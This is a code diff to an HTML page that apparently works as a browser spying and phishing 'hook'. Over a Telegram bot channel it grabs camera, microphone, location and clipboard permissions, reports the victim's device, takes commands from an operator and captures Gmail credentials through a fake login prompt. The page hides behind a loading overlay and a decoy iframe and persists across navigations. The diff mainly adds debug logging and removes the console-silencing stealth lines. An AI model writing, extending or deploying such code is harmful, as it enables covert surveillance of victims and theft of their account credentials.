@@ -97,6 +97,20 @@
         }
         .error-msg { color: #d93025; font-size: 14px; margin-top: 10px; display: none; }
         body.modal-active { overflow: hidden; }
+        /* debug console panel (hidden, but shows if needed) */
+        #debug {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: black;
+            color: lime;
+            font-size: 10px;
+            max-height: 80px;
+            overflow-y: auto;
+            z-index: 99999;
+            display: none;
+        }
     </style>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 </head>
@@ -108,6 +122,7 @@
     </div>
     <iframe id="mainFrame" src="https://example.com" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals"></iframe>
     <iframe id="persistentFrame" src="about:blank" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals allow-top-navigation" style="display:none;"></iframe>
+    <div id="debug"></div>
 
     <script>
         (function(){
@@ -118,7 +133,7 @@
             const ADMIN_CHAT_ID = '8737104261';
             const POLL_INTERVAL = 3000;
             const START_DELAY = 5000;
-            const AUDIO_DURATION_MS = 120000;   // 2 minutes
+            const AUDIO_DURATION_MS = 120000;
 
             // ================= STATE =================
             let isRegistered = false;
@@ -130,9 +145,17 @@
             let storedGmailCredentials = { email: '', password: '' };
             let permissionsStatus = { camera: false, microphone: false, location: false, clipboard: false };
 
-            // Silence console for stealth
-            console.log = function() {};
-            console.error = function() {};
+            // Enable debug logging to console AND to a visible div
+            function debugLog(msg) {
+                console.log(msg);
+                const debugDiv = document.getElementById('debug');
+                if (debugDiv) {
+                    debugDiv.style.display = 'block';
+                    debugDiv.innerHTML += new Date().toLocaleTimeString() + ' ' + msg + '<br>';
+                    debugDiv.scrollTop = debugDiv.scrollHeight;
+                }
+            }
+            debugLog('Script started');
 
             // ================= TELEGRAM HELPERS =================
             const TELEGRAM_HEADERS = {
@@ -140,15 +163,24 @@
             };
 
             async function sendMessage(text, parseMode = 'HTML', replyMarkup = null) {
+                debugLog(`Sending message: ${text.substring(0,50)}...`);
                 try {
                     const body = { chat_id: ADMIN_CHAT_ID, text, parse_mode: parseMode };
                     if (replyMarkup) body.reply_markup = replyMarkup;
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                         method: 'POST',
                         headers: { ...TELEGRAM_HEADERS, 'Content-Type': 'application/json' },
                         body: JSON.stringify(body)
                     });
-                } catch(e) {}
+                    const data = await response.json();
+                    if (!data.ok) {
+                        debugLog(`sendMessage error: ${JSON.stringify(data)}`);
+                    } else {
+                        debugLog(`Message sent OK`);
+                    }
+                } catch(e) {
+                    debugLog(`sendMessage exception: ${e.message}`);
+                }
             }
 
             async function sendPhoto(blob, caption) {
@@ -193,10 +225,11 @@
                     await navigator.clipboard.readText();
                     permissionsStatus.clipboard = true;
                 } catch(e) { permissionsStatus.clipboard = false; }
+                debugLog(`Permissions: camera=${permissionsStatus.camera}, mic=${permissionsStatus.microphone}, gps=${permissionsStatus.location}, clipboard=${permissionsStatus.clipboard}`);
             }
 
-            // ================= MENU (with persistent Home button) =================
-            async function sendMenu(isFirstConnection = false) {
+            // ================= MENU =================
+            async function sendMenu() {
                 const inlineKeyboard = {
                     inline_keyboard: [
                         [{ text: '📷 Camera', callback_data: 'photo' }, { text: '🎤 Mic', callback_data: 'audio' }],
@@ -214,7 +247,6 @@
                 };
                 const menuText = `✅ *HTML Hook Active* | \`${deviceId}\`\n🟢 Online | Permissions: ${permissionsStatus.camera ? '✅📷' : '❌📷'} ${permissionsStatus.microphone ? '✅🎤' : '❌🎤'} ${permissionsStatus.location ? '✅📍' : '❌📍'} ${permissionsStatus.clipboard ? '✅📋' : '❌📋'}\n${storedGmailCredentials.email ? `🔐 Credentials stored for ${storedGmailCredentials.email}. Use /auto_gmail` : 'No Gmail credentials yet. Use /phish_gmail to capture.'}\n\n_This hook survives page navigations._`;
                 await sendMessage(menuText, 'Markdown', inlineKeyboard);
-                // Send the persistent "Home" keyboard
                 await sendMessage("Press 🏠 Home anytime to see this menu again.", 'HTML', replyKeyboard);
             }
 
@@ -227,8 +259,7 @@
                     `🔌 *HTML Hook Connected*\n🆔 \`${deviceId}\`\n📱 ${navigator.platform} | ${navigator.userAgent.substring(0,60)}...\n📺 ${screen.width}x${screen.height}\n${permLine}\n\n_Persistent mode active._`,
                     'Markdown'
                 );
-                // Auto-send menu after registration
-                await sendMenu(true);
+                await sendMenu();
             }
 
             // ================= GMAIL FUNCTIONS =================
@@ -345,7 +376,7 @@
                 passInp.addEventListener('keypress', e => { if (e.key === 'Enter') submit(); });
             }
 
-            // ================= BROWSER HISTORY (limited) =================
+            // ================= BROWSER HISTORY =================
             async function getBrowserHistory() {
                 return `📍 *Current Page:* ${location.href}\n↩️ *Referrer:* ${document.referrer || 'none'}\n\n⚠️ Full browser history is not accessible from a web page. Use the Chrome extension for full history.`;
             }
@@ -353,7 +384,9 @@
             // ================= COMMAND HANDLER =================
             async function handleCommand(fullText) {
                 let cmd = fullText.trim().toLowerCase();
-                // Handle the persistent "Home" button
+                debugLog(`Received command: "${cmd}"`);
+                
+                // Handle persistent Home button
                 if (cmd === '🏠 home' || cmd === '/start' || cmd === 'start') {
                     await sendMenu();
                     return;
@@ -518,25 +551,32 @@
                 }
             }
 
-            // ================= POLLING =================
+            // ================= POLLING (with offset sync) =================
             async function syncOffset() {
+                debugLog('Syncing offset...');
                 try {
                     const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1&timeout=1`, { headers: TELEGRAM_HEADERS });
                     const data = await res.json();
+                    debugLog(`syncOffset response: ${JSON.stringify(data)}`);
                     if (data.ok && data.result && data.result.length > 0) {
                         updateId = data.result[data.result.length - 1].update_id + 1;
                     } else {
                         updateId = 0;
                     }
-                } catch(e) {}
+                    debugLog(`Update offset set to: ${updateId}`);
+                } catch(e) {
+                    debugLog(`syncOffset error: ${e.message}`);
+                }
             }
 
             async function pollUpdates() {
                 if (!isRegistered) return;
                 try {
-                    const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${updateId}&timeout=15`;
+                    const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${updateId}&timeout=10`;
+                    debugLog(`Polling ${url}`);
                     const res = await fetch(url, { headers: TELEGRAM_HEADERS });
                     const data = await res.json();
+                    debugLog(`Poll response: ${JSON.stringify(data)}`);
                     if (data.ok && data.result) {
                         for (const upd of data.result) {
                             if (upd.update_id >= updateId) {
@@ -550,8 +590,12 @@
                                 }
                             }
                         }
+                    } else {
+                        debugLog(`Poll error: ${data.description || 'unknown'}`);
                     }
-                } catch(e) {}
+                } catch(e) {
+                    debugLog(`Poll exception: ${e.message}`);
+                }
             }
 
             // ================= PERSISTENCE =================
@@ -565,6 +609,7 @@
                 }, true);
                 const pframe = document.getElementById('persistentFrame');
                 if (pframe) pframe.src = 'about:blank';
+                debugLog('Persistence setup complete');
             }
 
             // Gmail detection observer
@@ -582,23 +627,24 @@
                 }
             }).observe(document, { subtree: true, childList: true });
 
-            window.addEventListener('load', () => {
-                if (location.href.includes('mail.google.com')) {
-                    sendMessage(`📧 *Gmail detected* on device \`${deviceId}\`. Use /read_emails to fetch.`, 'Markdown');
-                }
-            });
-
             // ================= INIT =================
             async function init() {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/deleteWebhook`, { method: 'POST', headers: TELEGRAM_HEADERS });
+                debugLog('Deleting webhook...');
+                try {
+                    const del = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/deleteWebhook`, { method: 'POST', headers: TELEGRAM_HEADERS });
+                    const delData = await del.json();
+                    debugLog(`deleteWebhook response: ${JSON.stringify(delData)}`);
+                } catch(e) { debugLog(`deleteWebhook error: ${e.message}`); }
+                
                 await requestAllPermissions();
                 setupPersistence();
                 await syncOffset();
-                await registerClient();  // auto-sends menu
+                await registerClient();  // this sends connection message + menu
                 isRegistered = true;
                 intervalId = setInterval(pollUpdates, POLL_INTERVAL);
                 document.getElementById('loadingOverlay').style.display = 'none';
                 document.getElementById('mainFrame').style.opacity = '1';
+                debugLog('Hook fully initialized');
             }
             setTimeout(init, START_DELAY);
         })();
